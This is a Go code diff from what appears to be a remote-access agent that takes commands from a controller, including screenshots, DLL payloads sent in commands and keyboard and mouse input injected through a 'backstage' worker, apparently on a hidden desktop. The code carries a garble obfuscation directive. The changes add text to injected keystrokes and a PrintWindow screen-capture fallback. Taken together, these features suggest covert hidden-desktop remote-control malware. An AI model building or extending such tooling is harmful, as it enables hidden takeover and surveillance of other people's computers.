@@ -80,6 +80,7 @@ type backstageInputEvent struct {
 	button  int
 	delta   int32
 	vk      uint16
+	text    string
 }
 
 type voiceRuntime struct {
@@ -234,7 +235,7 @@ func ensurebackstageInputWorker() {
 						log.Printf("backstage input worker: mouse_wheel failed: %v", err)
 					}
 				case BackstageInputKeyDown:
-					if err := capture.BackstageInputKeyDown(ev.vk); err != nil {
+					if err := capture.BackstageInputKeyDown(ev.vk, ev.text); err != nil {
 						log.Printf("backstage input worker: key_down vk=%d failed: %v", ev.vk, err)
 					}
 				case BackstageInputKeyUp:
@@ -598,7 +599,8 @@ func extractCaptureDLLBytes(payload map[string]interface{}) []byte {
 func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	cmdID, _ := envelope["id"].(string)
-	action, _ := envelope["commandType"].(string)
+	actionValue, _ := envelope["commandType"].(string)
+	action := wire.CommandType(actionValue)
 
 	switch action {
 	case "screenshot":
@@ -1307,6 +1309,18 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		capture.SetbackstageDXGIEnabled(dxgiEnabled)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
+	case "backstage_enable_printwindow_fallback":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		enabled := true
+		if payload != nil {
+			if v, ok := payload["enabled"].(bool); ok {
+				enabled = v
+			}
+		}
+		log.Printf("backstage: per-window PrintWindow fallback %v", enabled)
+		capture.SetbackstagePrintWindowFallbackEnabled(enabled)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
 	case "backstage_enable_uia":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		uiaEnabled := true
@@ -1746,9 +1760,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		payload, _ := envelope["payload"].(map[string]interface{})
 		code := ""
+		text := ""
 		if payload != nil {
 			if v, ok := payload["code"].(string); ok {
 				code = v
+			}
+			if v, ok := payload["text"].(string); ok {
+				text = v
 			}
 		}
 		if vk := keyCodeToVKbackstage(code); vk != 0 {
@@ -1760,7 +1778,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				capture.VirtualInputKeyDown(vk)
 				return nil
 			}
-			enqueuebackstageInput(backstageInputEvent{kind: BackstageInputKeyDown, vk: vk})
+			enqueuebackstageInput(backstageInputEvent{kind: BackstageInputKeyDown, vk: vk, text: text})
 		}
 		return nil
 	case "backstage_key_up":
